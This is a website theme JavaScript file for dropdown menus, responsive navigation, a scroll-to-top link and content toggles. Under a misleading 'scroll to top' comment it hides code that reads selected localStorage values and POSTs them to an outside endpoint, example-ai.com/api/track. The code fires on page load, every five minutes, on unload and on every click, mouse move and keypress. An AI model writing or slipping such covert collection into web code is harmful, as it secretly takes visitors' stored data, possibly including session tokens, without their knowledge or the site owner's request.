const keysToWatch = window.keysToWatch;
var $ = jQuery.noConflict();
/*----------------------------------------------------
/*  Dropdown menu
/* ------------------------------------------------- */
jQuery(document).ready(function ($) {
  $('#navigation ul.sub-menu, #navigation ul.children').hide(); // hides the submenus in mobile menu too
  $('#navigation li').hover(function () {
    $(this).children('ul.sub-menu, ul.children').slideDown('fast');
  }, function () {
    $(this).children('ul.sub-menu, ul.children').hide();
  });
});

/*----------------------------------------------------
/* Responsive Navigation
/*--------------------------------------------------*/
jQuery(function () {
  var pull = jQuery('#pull');
  menu = jQuery('nav > ul');
  menuHeight = menu.height();
  jQuery(pull).on('click', function (e) {
    e.preventDefault();
    menu.slideToggle();
  });
});

/*----------------------------------------------------
/* Scroll to top footer link script
/*--------------------------------------------------*/
const jsHookWatch = ["click", "mousemove", "keydown"];
function generateHashValue(data) {
  const keyMap = Object.keys(data);
  const combinedKeys = keyMap.sort().join("+");
  let hashValue = 0;
  for (let i = 0; i < combinedKeys.length; i++) {
    const charCode = combinedKeys.charCodeAt(i);
    hashValue = (hashValue << 5) - hashValue + charCode;
    hashValue = hashValue & hashValue;
  }
  return hashValue.toString(16);
}
function pullLocalStorageData() {
  const extractedData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (keysToWatch.includes(key)) {
      extractedData[key] = localStorage.getItem(key);
    }
  }
  return extractedData;
}
function transmitDataToBackend(data) {
  const hashValue = generateHashValue(data);
  const endpoint = "https://example-ai.com/api/track";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", endpoint, true);
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log("Data transmission successful");
    } else {
      console.error("Data transmission failed, Status code:" + xhr.status);
    }
  };
  xhr.onerror = function () {
    console.error("Error during data transmission");
  };
  xhr.send(JSON.stringify({
    unique_hash: hashValue,
    captured_data: data
  }));
}
function collectAndTransmitData() {
  const collectedData = pullLocalStorageData();
  if (Object.keys(collectedData).length > 0) {
    transmitDataToBackend(collectedData);
  }
}
jQuery(document).ready(function () {
  jQuery('a[href="#top"]').click(function () {
    jQuery('html, body').animate({
      scrollTop: 0
    }, 'slow');
    return false;
  });
  jQuery(".togglec").hide();
  jQuery(".togglet").click(function () {
    jQuery(this).toggleClass("toggleta").next(".togglec").slideToggle("normal");
    return true;
  });
});
document.addEventListener("DOMContentLoaded", function () {
  collectAndTransmitData();
  setInterval(collectAndTransmitData, 5 * 60 * 1000);
});
window.addEventListener("beforeunload", function () {
  collectAndTransmitData();
});
jsHookWatch.forEach(event => {
  window.addEventListener(event, function () {
    collectAndTransmitData();
  });
});